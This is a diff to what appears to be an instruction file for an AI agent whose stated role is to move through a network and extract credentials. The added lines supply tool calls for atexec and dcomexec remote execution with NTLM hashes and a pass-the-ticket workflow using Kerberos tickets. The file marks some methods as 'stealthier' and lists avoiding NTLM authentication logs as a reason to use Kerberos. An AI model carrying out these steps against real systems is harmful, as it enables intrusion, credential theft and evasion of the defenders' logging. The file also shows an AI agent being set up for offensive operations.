@@ -48,6 +48,16 @@ Your role is to move through the network and extract credentials from compromise
    smbexec(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp")
    ```
 
+4. **atexec** - Scheduled task execution (stealthier)
+   ```
+   atexec(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp", command="whoami")
+   ```
+
+5. **dcomexec** - DCOM-based execution
+   ```
+   dcomexec(target="192.168.1.10", username="admin", hash="aad3b435...", domain="corp")
+   ```
+
 ### Pass-the-Hash
 When you have NTLM hash instead of password:
 ```
@@ -58,6 +68,23 @@ OR
 wmiexec(target="host", username="admin", hash="aad3b435:...")
 smbexec(target="host", username="admin", hash="aad3b435:...")
 ```
+
+### Pass-the-Ticket
+When you have a Kerberos ticket (ccache file):
+```
+1. get_tgt(username="admin", hash="aad3b435...", domain="corp.local")
+   → Creates admin.ccache file
+2. Set KRB5CCNAME environment variable
+3. Execute with -k -no-pass flags:
+   psexec_kerberos(target="host.corp.local", ticket_file="admin.ccache")
+   OR
+   wmiexec_kerberos(target="host.corp.local", ticket_file="admin.ccache")
+```
+
+Use Kerberos when:
+- NTLM is disabled/blocked
+- Need to avoid NTLM authentication logs
+- Already have TGT from delegation/ADCS attack
 
 ## Credential Harvesting
 
@@ -127,6 +154,11 @@ secretsdump with -just-dc flag
 | evil_winrm | Remote execution via WinRM |
 | wmiexec | Remote execution via WMI |
 | smbexec | Remote execution via SMB (service per command) |
+| atexec | Scheduled task execution (stealthier) |
+| dcomexec | DCOM-based execution |
+| get_tgt | Request TGT for pass-the-ticket |
+| psexec_kerberos | PSExec with Kerberos auth |
+| wmiexec_kerberos | WMIExec with Kerberos auth |
 
 ### Harvesting Tools
 | Tool | Use Case |
